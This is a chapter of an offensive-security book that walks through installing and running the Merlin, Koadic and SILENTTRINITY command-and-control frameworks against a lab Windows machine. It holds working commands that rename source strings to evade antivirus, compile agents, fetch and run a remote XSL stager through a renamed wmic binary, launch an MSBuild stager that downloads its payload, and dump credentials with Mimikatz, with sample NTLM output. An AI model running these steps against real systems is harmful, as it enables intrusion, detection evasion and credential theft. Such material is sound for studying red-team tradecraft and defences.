<html><head></head><body>
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="11" id="Page_11"/>2</span><br/>
<span class="ChapterTitle">Return of Command and Control</span></h1>
</header>
<figure class="opener">
<img src="image_fi/book_art/chapterart.png" alt=""/>
</figure>
<p class="ChapterIntro">Let’s build an attacking infrastructure by starting with the basic tooling of any attacker: the Command and Control (C2) server. We’ll look at three frameworks and test each on a virtual machine we’ll use as the target. First, we’ll look at how command and control used to be done, to see how we got where we are today.</p>
<h2 id="h1-501263c02-0001">Command and Control Legacy</h2>
<p class="BodyFirst">For the better part of the last decade, the undefeated champion of C2 frameworks—the one that offered the widest and most diverse array of exploits, stagers, and reverse shells—was the infamous Metasploit framework (<a href="https://www.metasploit.com/" class="LinkURL">https://www.metasploit.com/</a>). Perform a quick search for a pentesting or hacking tutorial, and I bet the first link will refer you to a post describing how to set up a meterpreter—the name of the custom payload used by <span epub:type="pagebreak" title="12" id="Page_12"/>Metasploit—on a Linux machine to achieve full control. Of course, the article will fail to mention that the default settings of the tool have been flagged by every security product since 2007, but let’s not be too cynical.</p>
<p>Metasploit is by far my first choice when taking control of a Linux box with no pesky antivirus software to crash the party. The connection is very stable, the framework has a lot of modules, and contrary to what many improvised tutorials seem to suggest, you can—and, in fact, <em>should</em>—customize every tiny bit of the executable template used to build the stager and the exploits. Metasploit works less well for Windows: it lacks a lot of post-exploit modules that are readily available in other frameworks, and the techniques employed by the meterpreter are first on the checklist of every antivirus software out there.</p>
<p>Windows being a different beast, I used to prefer the Empire framework (<a href="https://github.com/EmpireProject/Empire/" class="LinkURL">https://github.com/EmpireProject/Empire/</a>), which provides an exhaustive list of modules, exploits, and lateral movement techniques specifically designed for Active Directory. Sadly, Empire is no longer maintained by the original team, known by their Twitter handles: <a href="http://www.twitter.com/@harmj0y">@harmj0y</a>, <a href="http://www.twitter.com/@sixdub">@sixdub</a>, <a href="http://www.twitter.com/@enigma0x3">@enigma0x3</a>, <a href="http://www.twitter.com/@rvrsh3ll">@rvrsh3ll</a>, <a href="http://www.twitter.com/@killswitch_gui">@killswitch_gui</a>, and <a href="http://www.twitter.com/@xorrior">@xorrior</a>. They kickstarted a real revolution in the Windows hacking community and deserve our most sincere appreciation. Luckily, to the thrill of us all, Empire was brought back to life by the BC Security folks, who released version 3.0 in December 2019. I understand the reasoning behind the decision to cease maintaining Empire: the whole framework came into existence based on the premise that PowerShell allowed attackers to sail unhindered in a Windows environment, free from sleazy preventions such as antivirus software and monitoring. With this assumption challenged by Windows 10 features like PowerShell block logging and AMSI, it made sense to discontinue the project in favor of a newer generation of attacks, like using C# (for instance, SharpSploit: <a href="https://github.com/cobbr/SharpSploit/" class="LinkURL">https://github.com/cobbr/SharpSploit/</a>).</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	<em>Antimalware Scan Interface (AMSI)</em> is a component introduced in Windows 10 that intercepts API calls to critical Windows services—User Account Control (UAC), JScript, PowerShell, and so on—to scan for known threats and eventually block them: <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps" class="LinkURL">https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h2 id="h1-501263c02-0002">The Search for a New C2</h2>
<p class="BodyFirst">With the Empire project less of an option, I started looking for potential replacements. I was afraid of having to fall back on Cobalt Strike, as have 99 percent of consulting firms masquerading phishing campaigns as red team jobs. I have nothing against the tool—it’s awesome, provides great modularity, and deserves the success it has achieved. It’s just tiring and frustrating to see so many phony companies riding the wave of the red team business just because they bought a $3,500 Cobalt Strike license.</p>
<p>I was pleasantly surprised, however, to discover that so many open source C2 frameworks had hatched in the vacuum left by Empire. Here’s a brief look at some interesting ones that caught my attention. I will go rather quickly over many advanced concepts that are not that relevant to our present <span epub:type="pagebreak" title="13" id="Page_13"/>scenario, and will demonstrate a payload execution with each. If you do not fully understand how some payloads work, don’t worry. We will circle back to the ones we need later on.</p>
<h3 id="h2-501263c02-0001">Merlin</h3>
<p class="BodyFirst">Merlin (<a href="https://github.com/Ne0nd0g/merlin/" class="LinkURL">https://github.com/Ne0nd0g/merlin/</a>) is a C2 framework written, as it seems most popular tools are these days, in Golang. It can run on Linux, Windows, and basically any other platform supported by the Go runtime. The agent launched on the target machine can be a regular executable, like a DLL file or even a JavaScript file.</p>
<p>To get started with Merlin, first install the Golang environment. This will allow you to customize the executable agent and add post-exploitation modules—which is, of course, heavily encouraged.</p>
<p>Install Golang and Merlin with the following:</p>
<pre><code>root@Lab:~/# <b>add-apt-repository ppa:longsleep/golang-backports</b>
root@Lab:~/# <b>apt update &amp;&amp; sudo apt install golang-go</b>
root@Lab:~/# <b>go version</b>
go version go1.13 linux/amd64

root@Lab:~/# <b>git clone https://github.com/Ne0nd0g/merlin &amp;&amp; cd merlin</b></code></pre>
<p>The real novelty of Merlin is that it relies on HTTP/2 to communicate with its backend server. HTTP/2, as opposed to HTTP/1.x, is a binary protocol that supports many performance-enhancing features, like stream multiplexing, server push, and so forth (a great free resource that discusses HTTP/2 in depth can be found at <a href="https://daniel.haxx.se/http2/http2-v1.12.pdf" class="LinkURL">https://daniel.haxx.se/http2/http2-v1.12.pdf</a>). Even if a security device does catch and decrypt the C2 traffic, it might fail to parse the compressed HTTP/2 traffic and just forward it untouched.</p>
<p>If we compile a standard agent out of the box, it will be immediately busted by any regular antivirus agent doing simple string lookups for general conspicuous terms, so we need to make some adjustments. We’ll rename suspicious functions like <code>ExecuteShell</code> and remove references to the original package name, <code>github.com/Ne0nd0g/merlin</code>. We’ll use a classic <code>find</code> command to hunt for source code files containing these strings and pipe them into <code>xargs</code>, which will call <code>sed</code> to replace these suspicious terms with arbitrary words:</p>
<pre><code>root@Lab:~/# <b>find . -name '*.go' -type f -print0 \</b>
<b>| xargs -0 sed -i 's/ExecuteShell/MiniMice/g'</b>

root@Lab:~/# <b>find . -name '*.go' -type f -print0 \</b>
<b>| xargs -0 sed -i 's/executeShell/miniMice/g'</b>

root@Lab:~/# <b>find . -name '*.go' -type f -print0 \</b>
<b>| xargs -0 sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g'</b>

root@Lab:~/# <b>sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g' go.mod</b></code></pre>
<p><span epub:type="pagebreak" title="14" id="Page_14"/>This crude string replacement bypasses 90 percent of antivirus solutions, including Windows Defender. Keep tweaking it and then testing it against a tool like VirusTotal (<a href="https://www.virustotal.com/gui/" class="LinkURL">https://www.virustotal.com/gui/</a>) until you pass all tests.</p>
<p>Now let’s compile an agent in the <em>output</em> folder that we will later drop on a Windows test machine:</p>
<pre><code>root@Lab:~/# <b>make agent-windows DIR="./output"</b>
root@Lab:~/# <b>ls output/</b>
merlinAgent-Windows-x64.exe</code></pre>
<p>Once executed on a machine, <em>merlinAgent-Windows-x64.exe</em> should connect back to our Merlin server and allow complete takeover of the target.</p>
<p>We fire up the Merlin C2 server using the <code>go run</code> command and instruct it to listen on all network interfaces with the <code>-i 0.0.0.0 </code>option:</p>
<pre><code>root@Lab:~/# <b>go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk\</b>
<var>strongPassphraseWhateverYouWant</var>

[-] Starting h2 listener on 0.0.0.0:8443

Merlin&gt;&gt;

We execute the Merlin agent on a Windows virtual machine acting as the target to trigger the payload:

PS C:\&gt; <b>.\merlinAgent-Windows-x64.exe -url https://192.168.1.29:8443 -psk\</b>
<var>strongPassphraseWhateverYouWant</var></code></pre>
<p>And here is what you should see on your attack server:</p>
<pre><code>[+] New authenticated agent 6c2ba6-daef-4a34-aa3d-be944f1

Merlin&gt;&gt; <b>interact 6c2ba6-daef-4a34-aa3d-be944f1</b>
Merlin[agent][6c2ba6-daef-...]&gt;&gt; ls

[+] Results for job swktfmEFWu at 2020-09-22T18:17:39Z

Directory listing for: C:\
-rw-rw-rw-  2020-09-22 19:44:21  16432  Apps
-rw-rw-rw-  2020-09-22 19:44:15  986428 Drivers
<var>--snip--</var></code></pre>
<p>The agent works like a charm. Now we can dump credentials on the target machine, hunt for files, move to other machines, launch a keylogger, and so forth.</p>
<p>Merlin is still a project in its infancy, so you will experience bugs and inconsistencies, most of them due to the instability of the HTTP/2 library in Golang. It’s not called “beta” for nothing, after all, but the effort behind this project is absolutely amazing. If you’ve ever wanted to get involved in <span epub:type="pagebreak" title="15" id="Page_15"/>Golang, this could be your chance. The framework has just shy of 50 post-exploitation modules, from credential harvesters to modules for compiling and executing C# in memory.</p>
<h3 id="h2-501263c02-0002">Koadic</h3>
<p class="BodyFirst">The Koadic framework by zerosum0x0 (<a href="https://github.com/zerosum0x0/koadic/" class="LinkURL">https://github.com/zerosum0x0/koadic/</a>) has gained popularity since its introduction at DEF CON 25. Koadic focuses solely on Windows targets, but its main selling point is that it implements all sorts of trendy and nifty execution tricks: <code>regsvr32</code> (a Microsoft utility to register DLLs in the Windows Registry so they can be called by other programs; it can be used to trick DLLs like <em>srcobj.dll</em> into executing commands), <code>mshta</code> (a Microsoft utility that executes HTML Applications, or HTAs), XSL style sheets, you name it. Install Koadic with the following:</p>
<pre><code>root@Lab:~/# <b>git clone https://github.com/zerosum0x0/koadic.git</b>
root@Lab:~/# <b>pip3 install -r requirements.txt</b></code></pre>
<p>Then launch it with the following (I’ve also included the start of the <code>help</code> output):</p>
<pre><code>root@Lab:~/# <b>./koadic</b>

(koadic: sta/js/mshta)$ <b>help</b>
    COMMAND     DESCRIPTION
    ---------   -------------
    cmdshell    command shell to interact with a zombie
    creds       shows collected credentials
    domain      shows collected domain information
<var>--snip--</var></code></pre>
<p>Let’s experiment with a <em>stager</em>—a small piece of code dropped on the target machine to initiate a connection back to the server and load additional payloads (usually stored in memory). A stager has a small footprint, so should an antimalware tool flag our agent, we can easily tweak the agent without rewriting our payloads. One of Koadic’s included stagers delivers its payload through an ActiveX object embedded in an XML style sheet, also called <em>XSLT</em> (<a href="https://www.w3.org/Style/XSL/" class="LinkURL">https://www.w3.org/Style/XSL/</a>). Its evil formatting XSLT sheet can be fed to the native <code>wmic</code> utility, which will promptly execute the embedded JavaScript while rendering the output of the <code>os get</code> command. Execute the following in Koadic to spawn the stager trigger:</p>
<pre><code>(koadic: sta/js/mshta)$ <b>use stager/js/wmic</b>
(koadic: sta/js/wmic)$ <b>run</b>

[+] Spawned a stager at http://192.168.1.25:9996/ArQxQ.xsl

[&gt;] wmic os get /FORMAT:"http://192.168.1.25:9996/ArQxQ.xsl"</code></pre>
<p><span epub:type="pagebreak" title="16" id="Page_16"/>However, the preceding trigger command is easily caught by Windows Defender, so we have to tweak it a bit—for instance, by renaming <em>wmic.exe</em> to something innocuous like <em>dolly.exe</em>, as shown next. Depending on the Windows version of the victim machine, you may also need to alter the style sheet produced by Koadic to evade detection. Again, simple string replacement should do it (so much for machine learning in the AV world):</p>
<pre><code># Executing the payload on the target machine

C:\Temp&gt; <b>copy C:\Windows\System32\wbem\wmic.exe dolly.exe</b>
C:\Temp&gt; <b>dolly.exe os get /FORMAT:http://192.168.1.25:9996/ArQxQ.xsl</b></code></pre>
<p>Koadic refers to target machines as “zombies.” When we check for a zombie on our server, we should see details of the target machine:</p>
<pre><code># Our server

(koadic: sta/js/mshta)$ <b>zombies</b>

[+] Zombie 1: PIANO\wk_admin* @ PIANO -- Windows 10 Pro</code></pre>
<p>We refer to a zombie by its ID to get its basic system information:</p>
<pre><code>(koadic: sta/js/mshta)$ <b>zombies 1</b>
   ID:                     1
   Status:                 Alive
   IP:                     192.168.1.30
   User:                   PIANO\wk_admin*
   Hostname:               PIANO
<var>--snip--</var></code></pre>
<p>Next, we can choose any of the available implants with the command <code>use implant/</code>, from dumping passwords with Mimikatz to pivoting to other machines. If you’re familiar with Empire, then you will feel right at home with Koadic.</p>
<p>The only caveat is that, as with most current Windows C2 frameworks, you should customize and sanitize all payloads carefully before deploying them in the field. Open source C2 frameworks are just that: frameworks. They take care of the boring stuff like agent communication and encryption and provide extensible plug-ins and code templates, but every native exploit or execution technique they ship is likely tainted and should be surgically changed to evade antivirus and endpoint detection and response (EDR) solutions.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	Shout out to Covenant C2 (<a href="http://bit.ly/2TUqPcH" class="LinkURL">http://bit.ly/2TUqPcH</a>) for its outstanding ease of customization. The C# payload of every module can be tweaked right from the web UI before being shipped to the target.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>For this sanitization, sometimes a crude string replacement will do; other times, we need to recompile the code or snip out some bits. Do not expect any of these frameworks to flawlessly work from scratch on a brand-new and hardened Windows 10 system. Take the time to investigate the execution technique and make it fit your own narrative.</p>
<h3 id="h2-501263c02-0003"><span epub:type="pagebreak" title="17" id="Page_17"/>SILENTTRINITY</h3>
<p class="BodyFirst">The last C2 framework I would like to cover is my personal favorite: SILENTTRINITY (<a href="https://github.com/byt3bl33d3r/SILENTTRINITY" class="LinkURL">https://github.com/byt3bl33d3r/SILENTTRINITY</a>). It takes such an original approach that I think you should momentarily pause reading this book and go watch Marcello Salvati’s talk “IronPython . . . OMFG” about the .NET environment on YouTube.</p>
<p>To sum it up somewhat crudely, PowerShell and C# code produce intermediary assembly code to be executed by the .NET framework. Yet, there are many other languages that can do the same job: F#, IronPython, . . . and Boo-Lang! Yes, it is a real language; look it up. It’s as if a Python lover and a Microsoft fanatic were locked in a cell and forced to cooperate with each other to save humanity from impending Hollywoodian doom.</p>
<p>While every security vendor is busy looking for PowerShell scripts and weird command lines, SILENTTRINITY is peacefully gliding over the clouds using Boo-Lang to interact with Windows internal services and dropping perfectly safe-looking evil bombshells.</p>
<p>The tool’s serverside requires Python 3.7, so make sure to have Python properly working before installing it; then proceed to download and launch the SILENTTRINITY team server:</p>
<pre><code># Terminal 1
root@Lab:~/# <b>git clone https://github.com/byt3bl33d3r/SILENTTRINITY</b>
root@Lab:~/# <b>cd SILENTTRINITY</b>
root@Lab:ST/# <b>python3.7 -m pip install setuptools</b>
root@Lab:ST/# <code class="bold">python3.7 -m pip install -r requirements.txt</code>

# Launch the team server
root@Lab:ST/# <code class="bold">python3.7 teamserver.py 0.0.0.0</code> <var class="bold">strongPasswordCantGuess</var><code class="bold"> &amp;</code></code></pre>
<p>Instead of running as a local stand-alone program, SILENTTRINITY launches a server that listens on port 5000, allowing multiple members to connect, define their listeners, generate payloads, and so on, which is very useful in team operations. You need to leave the server running in the first terminal and then open a second to connect to the team server and configure a listener on port 443:</p>
<pre><code># Terminal 2

root@Lab:~/# <b>python3.7 st.py wss://username:</b><var class="bold">strongPasswordCantGuess</var><b>@192.168.1.29:5000</b>
[1] ST &gt;&gt;  <b>listeners</b>
[1] ST (listeners)&gt;&gt; <b>use https</b>

# Configure parameters
[1] ST (listeners)(https) &gt;&gt; <b>set Name customListener</b>
[1] ST (listeners)(https) &gt;&gt; <b>set CallBackUrls</b>
<b>https://www.customDomain.com/news-article-feed</b>

# Start listener
[1] ST (listeners)(https) &gt;&gt; <b>start</b>
<span epub:type="pagebreak" title="18" id="Page_18"/>[1] ST (listeners)(https) &gt;&gt; list
Running:
customListener &gt;&gt; https://192.168.1.29:443</code></pre>
<p>Once you are connected, the next logical step is to generate a payload to execute on the target. We opt for a .NET task containing inline C# code that we can compile and run on the fly using a .NET utility called MSBuild:</p>
<pre><code>[1] ST (listeners)(https) &gt;&gt; <b>stagers</b>

[1] ST (stagers) &gt;&gt; <b>use msbuild</b>
[1] ST (stagers) &gt;&gt; <b>generate customListener</b>
[+] Generated stager to ./stager.xml</code></pre>
<p>If we take a closer look at the <em>stager.xml</em> file, we can see it embeds a base64-encoded version of an executable called <em>naga.exe</em> (<em>SILENTTRINITY/core/teamserver/data/naga.exe</em>), which connects back to the listener we set up and then downloads a ZIP file containing Boo-Lang DLLs and a script to bootstrap the environment.</p>
<p>Once we compile and run this payload on the fly using MSBuild, we will have a full Boo environment running on the target’s machine, ready to execute whatever shady payload we send its way:</p>
<pre><code># Start agent

PS C:\&gt; <b>C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe stager.xml</b>

[*] [TS-vrFt3] Sending stage (569057 bytes) -&gt;  192.168.1.30...
[*] [TS-vrFt3] New session 36e7f9e3-13e4-4fa1-9266-89d95612eebc connected! (192.168.1.30)
[1] ST (listeners)(https) &gt;&gt; <b>sessions</b>
[1] ST (sessions) &gt;&gt; <b>list</b>
Name           &gt;&gt; User         &gt;&gt; Address     &gt;&gt; Last Checkin
36e7f9e3-13... &gt;&gt; *wk_adm@PIANO&gt;&gt; 192.168.1.3 &gt;&gt; h 00 m 00 s 04</code></pre>
<p>Notice how, unlike with the other two frameworks, we did not bother customizing the payload to evade Windows Defender. It just works . . . for now!</p>
<p>We can deliver any of the current 69 post-exploitation modules, from loading an arbitrary assembly (.NET executable) in memory to regular Active Directory reconnaissance and credential dumping:</p>
<pre><code>[1] ST (sessions) &gt;&gt; <b>modules</b>
[1] ST (modules) &gt;&gt; <b>use boo/mimikatz</b>
[1] ST (modules)(boo/mimikatz) &gt;&gt; <b>run all</b>

[*] [TS-7fhpY] 36e7f9e3-13e4-4fa1-9266-89d95612eebc returned job result
(id: zpqY2hqD1l)
[+] Running in high integrity process
<var>--snip--</var>
    msv :
    [00000003] Primary
    * Username : wkadmin
<span epub:type="pagebreak" title="19" id="Page_19"/>    * Domain   : PIANO.LOCAL
    * NTLM     : adefd76971f37458b6c3b061f30e3c42
<var>--snip--</var></code></pre>
<p>The project is still very young, yet it displays tremendous potential. If you are a complete beginner, though, you may suffer from the lack of documentation and explicit error handling. The tool is still in active development, so that’s hardly a surprise. I would suggest you first explore more accessible projects like Empire before using and contributing to SILENTTRINITY. And why not? It sure is a hell of a project!</p>
<p>There are many more frameworks that came to life during the last couple of years that are all worth checking out: Covenant, Faction C2, and so on. I strongly encourage you to spin up a couple of virtual machines, play with them, and choose whichever one you feel most comfortable with.</p>
<h2 id="h1-501263c02-0003">Resources</h2>
<ul>
<li>Find more information on the <code>regsvr32</code> Microsoft utility at <a href="http://bit.ly/2QPJ6o9" class="LinkURL">http://bit.ly/2QPJ6o9</a> and <a href="https://www.drdobbs.com/scriptlets/199101569" class="LinkURL">https://www.drdobbs.com/scriptlets/199101569</a>.</li>
<li>Look at Emeric Nasi’s blog post “Hacking around HTA files” for more on <code>mshta</code>: <a href="https://blog.sevagas.com/" class="LinkURL">https://blog.sevagas.com/</a>.</li>
<li>See Antonio Parata’s paper “.NET Instrumentation via MSIL Bytecode Injection” for more information on assemblies in the .NET framework: <a href="http://bit.ly/2IL2I8g" class="LinkURL">http://bit.ly/2IL2I8g</a>.</li>
</ul>
</section>
</body></html>